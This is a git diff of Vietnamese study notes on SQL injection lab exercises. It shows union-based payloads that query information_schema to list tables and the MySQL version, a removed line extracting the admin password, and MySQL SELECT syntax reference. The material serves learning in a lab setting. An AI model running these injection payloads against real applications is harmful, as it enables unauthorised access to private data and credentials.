@@ -1,4 +1,4 @@
-## SQL INJECTION ##
+<img width="812" height="30" alt="image" src="https://github.com/user-attachments/assets/f4377eeb-0651-4633-a47c-26713515a19a" />## SQL INJECTION ##
 
 # INTERACTIVE LEARNING 
 
@@ -109,25 +109,89 @@ Nên ta sẽ tìm cách để sql trả về kết quả cả 2 giá trị usern
 
 <img width="425" height="359" alt="image" src="https://github.com/user-attachments/assets/73e878fd-60dc-4c30-a164-5d6d2ceff489" />
 
-Nhưng hàm check password còn hash input để so với dbs
+Nhưng hàm còn check password 
 
 <img width="611" height="134" alt="image" src="https://github.com/user-attachments/assets/017d59d0-2df9-4c40-97ed-3afd8b2d7ef5" />
 
-Chú ý thông báo còn trả về thông tin này 
- Vậy ta phải tìm ra payload để thông báo này trả về password của tài khoản admin
+<img width="421" height="202" alt="image" src="https://github.com/user-attachments/assets/eedee8b0-4f23-43a7-98c6-cb71a028cb3b" />
 
-<img width="437" height="358" alt="image" src="https://github.com/user-attachments/assets/4be4c8f5-a66e-4b4b-baf4-188d6773266a" />
 
- `SELECT username, password FROM users WHERE username='aaaa' union select password, 1 from users where username='admin' `
+Ý tưởng: Thao túng/làm giả kết quả ? tạo ra fake password
 
- <img width="818" height="364" alt="image" src="https://github.com/user-attachments/assets/6ebfc6a5-4cdd-4be9-aad8-5b5082b92291" />
+ĐỂ LẠI
 
-Lấy giá trị đầu tiên từ  result test của SQL 
+# 6. Basic 6
+
+Goal: Extract database version
+
+<img width="681" height="317" alt="image" src="https://github.com/user-attachments/assets/f085ac7f-a19b-4c2b-b0d2-c54428ffdb3c" />
+
+ Lab này sẽ lấy content dựa trên id người dùng nhập vào
+
+Đề bài yêu cầu tìm thông tin trong database, vậy ta sẽ check version và database 
+
+<img width="854" height="427" alt="image" src="https://github.com/user-attachments/assets/2157f8e3-6849-40c2-8940-c89e3dc68412" />
+
+Thông tin trả về hiện khi ta kiểm tra trong burp
+
+<img width="443" height="68" alt="image" src="https://github.com/user-attachments/assets/1c9c3331-9f29-4fec-aecd-8feecba8795a" />
+
+<img width="584" height="378" alt="image" src="https://github.com/user-attachments/assets/85fdf1c0-3349-4aaf-a335-e731f88c2acd" />
+
+string(94) "SELECT content FROM posts WHERE id=999 union select table_name from information_schema.tables"
+
+<img width="197" height="12" alt="image" src="https://github.com/user-attachments/assets/3458a42e-ef79-46d0-8821-64ba5bdca305" />
+
+
+
+`string(111) "SELECT content FROM posts WHERE id=999 union select table_name from information_schema.tables limit 1 offset 1"`
+
+--> bảng users
+
+Tiếp tục ta có lần lượt những database sau
+- posts_db
+- test
+- users
+- ADMINISTRABLE_ROLE_AUTHORIZATIONS
+- APPLICABLE_ROLES
+- CHARACTER_SETS
+- CHECK_CONSTRAINTS
+- COLLATIONS
+- COLLATION_CHARACTER_SET_APPLICABILITY
+- COLUMNS
+- COLUMNS_EXTENSIONS
+- COLUMN_PRIVILEGES
+- COLUMN_STATISTICS
+- ENABLED_ROLES
+- ENGINES
+- EVENTS
+- FILES
+- INNODB_BUFFER_PAGE
+- INNODB_BUFFER_PAGE_LRU
+- INNODB_BUFFER_POOL_STATS
+- INNODB_CACHED_INDEXES
+- ........
+
+Và version: 8.0.46
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 # NOTE
 
-Thứ tự thực thi 
+# 1. Thứ tự thực thi 
 
 ```
 INTERVAL
@@ -149,7 +213,55 @@ OR, ||
 = (assignment), :=
 ```
 
+# 2. Thứ tự thực thi SELECT STATEMENT 
 
+```
+SELECT
+    [ALL | DISTINCT | DISTINCTROW ]
+    [HIGH_PRIORITY]
+    [STRAIGHT_JOIN]
+    [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
+    [SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
+    select_expr [, select_expr] ...
+    [into_option]
+    [FROM table_references
+      [PARTITION partition_list]]
+    [WHERE where_condition]
+    [GROUP BY [ {col_name | expr | position}, ... [WITH ROLLUP]
+              | ROLLUP ({col_name | expr | position}, ...)] ]
+    [HAVING where_condition]
+    [WINDOW window_name AS (window_spec)
+        [, window_name AS (window_spec)] ...]
+    [ORDER BY {col_name | expr | position}
+      [ASC | DESC], ... [WITH ROLLUP]]
+    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
+    [into_option]
+    [FOR {UPDATE | SHARE}
+        [OF tbl_name [, tbl_name] ...]
+        [NOWAIT | SKIP LOCKED]
+      | LOCK IN SHARE MODE]
+    [into_option]
+
+into_option: {
+    INTO OUTFILE 'file_name'
+        [CHARACTER SET charset_name]
+        export_options
+  | INTO DUMPFILE 'file_name'
+  | INTO var_name [, var_name] ...
+}
+
+export_options:
+    [{FIELDS | COLUMNS}
+        [TERMINATED BY 'string']
+        [[OPTIONALLY] ENCLOSED BY 'char']
+        [ESCAPED BY 'char']
+    ]
+    [LINES
+        [STARTING BY 'string']
+        [TERMINATED BY 'string']
+    ]
+```
+(https://dev.mysql.com/doc/refman/9.7/en/select.html)
 
 Tại sao `SELECT * FROM username='a' OR '1' AND password=''` output lại là 0 row ?
 
